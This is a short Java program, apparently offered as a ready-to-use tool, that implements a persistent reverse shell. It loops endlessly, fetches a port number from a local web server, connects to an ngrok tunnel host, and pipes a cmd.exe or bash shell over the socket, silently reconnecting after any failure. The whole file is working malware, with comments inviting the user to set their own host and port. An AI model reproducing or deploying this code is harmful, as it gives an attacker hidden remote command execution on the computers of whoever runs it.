package daze_shark;

import java.io.*;
import java.net.*;

public class Daze_shark {

    public static void main(String[] args) throws IOException, InterruptedException {
        String os = System.getProperty("os.name").toLowerCase();
        BufferedReader br = null;
        while (true) {
            String cmd = null;
            if (os.indexOf("win") >= 0) {
                cmd = "cmd.exe";
            } else {
                cmd = "/bin/bash";
            }
            try {
                URL url = new URL("http://192.168.1.16/port2.txt");
                br = new BufferedReader(new InputStreamReader(url.openStream()));

                String host = "4.tcp.ngrok.io"; // set your ip
                int port = Integer.parseInt(br.readLine()); //set any port you like

                Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                Socket s = new Socket(host, port);
                InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
                OutputStream po = p.getOutputStream(), so = s.getOutputStream();
                while (!s.isClosed()) {
                    while (pi.available() > 0) {
                        so.write(pi.read());
                    }

                    so.write(pe.read());
                    po.write(si.read());

                    so.flush();
                    po.flush();
                    Thread.sleep(50);
                    try {
                        p.exitValue();
                        break;
                    } catch (Exception e) {
                        continue;
                    }

                }
                p.destroy();
                s.close();
            } catch (Exception e) {

                continue;

            }
        }
    }
}
